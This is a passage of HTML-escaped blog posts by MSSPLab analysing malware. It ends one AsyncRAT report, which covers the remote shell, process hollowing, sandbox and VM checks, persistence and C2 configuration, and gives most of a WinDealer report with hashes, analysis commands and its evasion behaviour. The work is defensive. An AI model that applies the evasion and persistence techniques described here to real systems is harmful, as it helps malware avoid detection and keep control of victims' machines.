&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_14-49.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note that all these operations require sufficient permissions. If the &lt;em&gt;AsyncRAT&lt;/em&gt; client doesn’t have the necessary permissions, these operations will fail.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remote Shell&lt;/strong&gt; - The client can execute shell commands from the server, enabling an even greater degree of control.&lt;/p&gt;

&lt;p&gt;The ability to execute shell commands remotely is a powerful feature of &lt;em&gt;AsyncRAT&lt;/em&gt;. This feature allows the attacker to execute virtually any command, as if they were physically present at the victim’s machine.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; executes shell commands by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Diagnostics.Process&lt;/code&gt; class in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET Framework&lt;/code&gt;. This class provides the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start&lt;/code&gt; method, which can start a new process. To execute a shell command, &lt;em&gt;AsyncRAT&lt;/em&gt; starts a new instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt; with the shell command as a parameter (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin/Miscellaneous/Miscellaneous/Handler/HandleShell.cs&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_15-22.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;stealth-and-persistence&quot;&gt;Stealth and Persistence&lt;/h3&gt;

&lt;p&gt;To evade detection, &lt;em&gt;AsyncRAT&lt;/em&gt; uses several techniques:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Process Injection&lt;/strong&gt; - &lt;em&gt;AsyncRAT&lt;/em&gt; injects its core functionality into a separate process to hide its malicious activities.&lt;/p&gt;

&lt;p&gt;The injector is used to load into the memory the &lt;em&gt;AsyncRAT&lt;/em&gt; file by taking advantage of the &lt;a href=&quot;https://attack.mitre.org/techniques/T1055/012/&quot;&gt;Process Hollowing&lt;/a&gt; technique. As demonstrated, a new thread is created, put in a suspended state (pause), the target file mapped into the memory, and then executed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-06.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_15-57.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Anti-Analysis&lt;/strong&gt; - The client employs various anti-analysis techniques, including the detection of virtual machines and sandbox environments.&lt;/p&gt;

&lt;p&gt;Malware often employs anti-analysis techniques to evade detection, avoid being analyzed in a controlled environment, and ultimately to make reverse-engineering more challenging. This includes checks for virtual machines (VMs) and sandbox environments, which are commonly used tools for malware analysis.&lt;/p&gt;

&lt;p&gt;Analyzing the source code of &lt;em&gt;AsyncRAT&lt;/em&gt;, you may find various techniques that it employs to achieve this (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Client/Helper/Anti_Analysis.cs&lt;/code&gt;). While specific implementation details could vary depending on the version or variant of the RAT, here’s an example of what these anti-analysis checks might look like in practice.&lt;/p&gt;

&lt;p&gt;Here is how AsyncRAT check for a VM and a sandbox:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-08.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-13.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, just check if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sbiedll.dll&lt;/code&gt; is loaded, which is a module of sandboxie sandbox.&lt;/p&gt;

&lt;p&gt;Also check disk size:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-11.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The logic is simple, determine if a compromised host is operating in a malware lab or sandbox by examining the size of its hard drive.&lt;/p&gt;

&lt;p&gt;Another method is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsXP&lt;/code&gt;: check if its process is running in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XP Windows&lt;/code&gt; Operating System:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-12.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Check if remote debugger exist:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-14.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following image depicts the code that drops a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bat&lt;/code&gt; script in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%temp%&lt;/code&gt; folder to delete itself as part of a defense evasion technique to clear its trace after execution and drop a copy of itself on the compromised host:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-21.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Persistence&lt;/strong&gt; - The client installs itself to the registry or startup folder to maintain persistence after system reboots.&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;AsyncRAT&lt;/em&gt; client will verify that its code executes with administrative permissions. If so, it will add Windows Scheduled Tasks using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;schtasks.exe&lt;/code&gt; with the highest runlevel permissions to execute a duplicate of itself, if &lt;em&gt;AsyncRAT&lt;/em&gt; is not running with administrative privileges, it will use Registry Run Key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; for its persistence:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-28.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;connection-and-control&quot;&gt;Connection and Control&lt;/h3&gt;

&lt;p&gt;On execution, the client initiates a connection to the server. After a successful connection, the client sends detailed system information to the server, including the computer name, user name, operating system, processor, and installed antivirus software. The client also downloads a small &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET&lt;/code&gt; assembly DLL file from the server, which is injected into a newly created process. This is where the &lt;em&gt;AsyncRAT&lt;/em&gt;’s core functionality is executed.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; will decrypt its AES encrypted configuration data including the port and C2 IP address that will be used for C2 communication:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-49.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is the code snippet for C2 server communication and C2 downloads:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_16-53.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;updating-and-uninstalling&quot;&gt;Updating and Uninstalling&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;AsyncRAT&lt;/em&gt; allows for the updating and uninstalling of the client directly from the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3/2023-05-20_17-03.png&quot; alt=&quot;asyncrat&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The uninstall functionality would typically involve the server sending a command to the client, telling it to remove itself from the infected machine. This might involve deleting the client binary, as well as any other files created by the client. The client might also remove any registry keys it has created, and undo any other changes it has made to the system.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Given its open-source nature and availability on GitHub since January 2019, &lt;em&gt;AsyncRAT&lt;/em&gt; is accessible to a wide range of threat actors, including both individual malicious actors and sophisticated APT groups. This availability, combined with its powerful features, makes it a popular choice for cybercriminals.&lt;/p&gt;

&lt;p&gt;The observed campaigns leveraging spear-phishing attacks and script loaders, such as the one using a Microsoft OneNote attachment to load a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.HTA&lt;/code&gt; file, demonstrate that attackers can employ a variety of methods to deliver &lt;em&gt;AsyncRAT&lt;/em&gt; to targeted hosts or networks. This underlines the importance of a comprehensive security posture, encompassing not just malware detection and removal, but also employee training and robust email security measures to combat spear-phishing attacks.&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp&quot;&gt;https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.asyncrat&quot;&gt;https://malpedia.caad.fkie.fraunhofer.de/details/win.asyncrat&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://twitter.com/anyrun_app/status/1617401778240102400?s=20&amp;amp;t=ED5KEvCMTz8_F2IjR61j8Q&quot;&gt;https://twitter.com/anyrun_app/status/1617401778240102400&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://any.run/malware-trends/&quot;&gt;https://any.run/malware-trends/&lt;/a&gt;     &lt;br /&gt;
&lt;a href=&quot;https://attack.mitre.org/techniques/T1055/012/&quot;&gt;MITRE ATT&amp;amp;CK: Process Hollowing&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://research.splunk.com/stories/asyncrat/&quot;&gt;https://research.splunk.com/stories/asyncrat/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">AsyncRAT is a Remote Access Trojan (RAT) designed to remotely monitor and control infected systems. It is free, open-source, and often used by cybercriminals for malicious purposes, such as stealing sensitive information, installing more malware, or performing DDoS attacks.</summary></entry><entry><title type="html">Malware analysis report: WinDealer (LuoYu Threat Group)</title><link href="http://localhost:4001/threat-hunting/2023/05/08/malware-analysis-windealer.html" rel="alternate" type="text/html" title="Malware analysis report: WinDealer (LuoYu Threat Group)" /><published>2023-05-08T05:00:00+03:00</published><updated>2023-05-08T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/05/08/malware-analysis-windealer</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/05/08/malware-analysis-windealer.html">&lt;p&gt;WinDealer is a type of malware that is used for financial fraud and theft. It is a banking Trojan that is designed to steal sensitive financial information, such as login credentials, credit card numbers, and other personal information from victims’ computers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-05-08_12-08.png&quot; alt=&quot;windealer&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following are the capabilities of the malware:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Manipulation of files and file systems: reading, writing, and deleting files, listing directories, and collecting disk information&lt;/li&gt;
  &lt;li&gt;Information collection: gathering device details, network settings, and/or keyboard layout, listing running processes, installed software, and configuration files of popular messaging services (Skype, QQ, WeChat, and Wangwang);&lt;/li&gt;
  &lt;li&gt;Download and upload random file types; arbitrarily executed commands;&lt;/li&gt;
  &lt;li&gt;System-wide text file and Microsoft Word document search;&lt;/li&gt;
  &lt;li&gt;Screenshot taking;&lt;/li&gt;
  &lt;li&gt;Discovery of networks through ping scan;&lt;/li&gt;
  &lt;li&gt;Backdoor maintenance: enabling or disabling persistence (through the RUN key in the registry) and configuration changes&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;threat-actor&quot;&gt;Threat actor&lt;/h3&gt;

&lt;p&gt;LuoYu is a threat group that is believed to be a Chinese state-sponsored hacking group. The group has been active since at least 2011 and is known to target a wide range of industries, including defense, government, telecommunications, and technology.&lt;/p&gt;

&lt;h3 id=&quot;target&quot;&gt;Target&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Geographies and sectors&lt;/em&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Chinese subsidiaries of Japanese companies&lt;/li&gt;
  &lt;li&gt;Users of a Chinese private bank&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Industry&lt;/em&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Technology&lt;/li&gt;
  &lt;li&gt;Media&lt;/li&gt;
  &lt;li&gt;Financial&lt;/li&gt;
  &lt;li&gt;Military&lt;/li&gt;
  &lt;li&gt;Telecom&lt;/li&gt;
  &lt;li&gt;Ministries of Foreign Affairs&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cyber-kill-chain&quot;&gt;Cyber Kill Chain&lt;/h3&gt;

&lt;p&gt;WinDealer steals information of an infected &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC&lt;/code&gt; and sends it to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C2&lt;/code&gt; server as described in here:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_21-53.png&quot; alt=&quot;ckc&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;identification&quot;&gt;Identification&lt;/h3&gt;

&lt;p&gt;Two samples are being investigated:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sample.exe&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;372736 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cc7207f09a6fe41c71626ad4d3f127ce&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;84e749c37978f9387e16fab29c7b1b291be93a63&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;28df5c75a2f78120ff96d4a72a3c23cee97c9b46c96410cf591af38cb4aed0fa&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First of all, check our sample via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/28df5c75a2f78120ff96d4a72a3c23cee97c9b46c96410cf591af38cb4aed0fa/details&quot;&gt;https://www.virustotal.com/gui/file/28df5c75a2f78120ff96d4a72a3c23cee97c9b46c96410cf591af38cb4aed0fa/details&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-16.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So, 52 of 68 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-18.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;More of them detect file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backdoor.Win32.WINDEALER.ZYJA&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;static-analysis&quot;&gt;Static analysis&lt;/h3&gt;

&lt;p&gt;The specified sample is a PE file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-13.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hexdump &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-14.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; for looking metadata:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_11-09.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we see that file timestamp is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2021-01-25 13:32:26+03.00&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Executable sample is not packed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upx&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upx &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_11-11.png&quot; alt=&quot;upx&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What about Shannon entropy of the sample:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-15.png&quot; alt=&quot;shannon&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analysze with DIE says that the compiler is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Microsoft Visual Studio C++ (6.0)&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-19.png&quot; alt=&quot;die&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-20.png&quot; alt=&quot;die&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Malware contains encrypted DLL:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-29_14-22.png&quot; alt=&quot;die&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting strings:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_11-30.png&quot; alt=&quot;strings&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The hardcoded version of WinDealer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_11-34.png&quot; alt=&quot;version&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;18.20.1225&lt;/code&gt; - version: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;18&lt;/code&gt;, year: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2020&lt;/code&gt;, month and day: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;12.25&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;another intersting strings is:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSTEM\CurrentControlSet\Control\Network\{4D36E972-E325-11CE-BFC1-08002BE10318}\%s\Connection&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_11-43.png&quot; alt=&quot;string&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dynamic-analysis&quot;&gt;Dynamic analysis&lt;/h3&gt;

&lt;p&gt;The sample is GUI application:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-38.png&quot; alt=&quot;winmain&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Contacted IP addresses is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-25.png&quot; alt=&quot;ip&quot; /&gt;&lt;/p&gt;

&lt;p&gt;May sleep (evasive loops) to hinder dynamic analysis:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-32.png&quot; alt=&quot;sleep&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-45.png&quot; alt=&quot;sleep&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The operator has the power to rename, move, and delete files on the target machine:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-50.png&quot; alt=&quot;createfile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-53.png&quot; alt=&quot;createfile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-54.png&quot; alt=&quot;delete&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also malware search through directories and enum filesystem:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-48.png&quot; alt=&quot;createfile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and collecting volume information:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-53_1.png&quot; alt=&quot;vol&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;api-hooking&quot;&gt;API hooking&lt;/h4&gt;

&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InterlockedExchange&lt;/code&gt;, probably the malware sample is hooking the winapi functions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-06.png&quot; alt=&quot;interlocked&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;avsandbox-evasion&quot;&gt;AV/Sandbox evasion&lt;/h4&gt;

&lt;p&gt;In the malware sample above, the delay timeout is set using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTickCount()&lt;/code&gt; timer function. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; function is called in a loop until the timer timeout. In the sandbox, delays that are performed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; function are skipped (replaced with a very short timeout) and the virtually elapsed time will be much higher than the requested timeout. The concept behind these methods is to measure elapsed time while running several forms of delays in parallel:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-01.png&quot; alt=&quot;timer&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;sample2.exe&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;458752 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76ba5272a17fdab7521ea21a57d23591&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6b831413932a394bd9fb25e2bbdc06533821378c&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ecd001aeb6bcbafb3e2fda74d76eea3c0ddad4e6e7ff1f43cd7709d4b4580261&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;VirusTotal scan result:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/ecd001aeb6bcbafb3e2fda74d76eea3c0ddad4e6e7ff1f43cd7709d4b4580261/detection&quot;&gt;https://www.virustotal.com/gui/file/ecd001aeb6bcbafb3e2fda74d76eea3c0ddad4e6e7ff1f43cd7709d4b4580261/detection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-19.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-20.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;static-analysis-1&quot;&gt;Static analysis&lt;/h3&gt;

&lt;p&gt;The specified sample is a PE file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &amp;lt;sample2.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-02.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hexdump &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;sample2.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-03.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Run exiftool for extracting metadata:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &amp;lt;sample2.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_12-21.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The sample is a Windows GUI file with timestamp: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2021:03:06 04:13:51+03:00&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;dynamic-analysis-1&quot;&gt;Dynamic analysis&lt;/h3&gt;

&lt;p&gt;Generating victim &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ID&lt;/code&gt; set in a registry key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_15-54.png&quot; alt=&quot;victim&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The format of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;victim ID&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5(&quot;&amp;lt;MAC address&amp;gt;+&amp;lt;Physical_Drive_info&amp;gt;+&amp;lt;username&amp;gt;&quot;)&lt;/code&gt;. The malware generates a unique registry entry to store the victim ID for subsequent execution. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;victim ID&lt;/code&gt; is not saved as raw data; instead, the malware changes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt; bytes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;victim ID&lt;/code&gt; to an IP address format.&lt;/p&gt;

&lt;p&gt;This sample collecting host information:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-27.png&quot; alt=&quot;host&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;encoding&quot;&gt;Encoding&lt;/h4&gt;

&lt;p&gt;Malware sample use function call obfuscation:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetUserNameW&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-43.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;

